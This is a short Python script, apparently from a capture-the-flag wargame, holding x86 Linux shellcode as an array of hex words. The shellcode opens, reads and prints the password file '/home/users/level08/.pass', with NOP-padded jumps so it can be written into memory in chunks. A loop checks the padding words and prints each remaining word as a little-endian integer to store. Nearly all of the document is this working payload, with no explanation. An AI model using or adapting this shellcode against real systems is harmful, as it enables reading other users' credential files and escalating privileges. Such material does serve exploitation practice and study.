a = [
    0x31c9f7e1,
    0xb005eb04,
    0x90909090,
    0xbb8dffff,
    0xff90eb04,
    0x90909090,
    0xf7db5390,
    0x9090eb04,
    0x90909090,
    0x682e7061,
    0x7390eb04,
    0x90909090,
    0x686c3038,
    0x2f90eb04,
    0x90909090,
    0x686c6576,
    0x6590eb04,
    0x90909090,
    0x68657273,
    0x2f90eb04,
    0x90909090,
    0x68652f75,
    0x7390eb04,
    0x90909090,
    0x682f686f,
    0x6d90eb04,
    0x90909090,
    0x89e3cd80,
    0x9391eb04,
    0x90909090,
    0xb00366ba,
    0xff0feb04,
    0x90909090,
    0x42cd8092,
    0xb301eb04,
    0x90909090,
    0xc1e80acd,
    0x8090eb04,
    0x90909090,
    0x93c39090,
]

0x01020304
0x01020304
0x01020304

j = 0
for i in a:
    j += 1
    if j % 3 == 0:
        if i != 0x90909090:
            print("WRONG VALUE AT IDX=" + str(j))
        continue
    print("store")
    print(int(i.to_bytes(4, byteorder='little').hex(), 16))
    #print(int(i))
    print(j)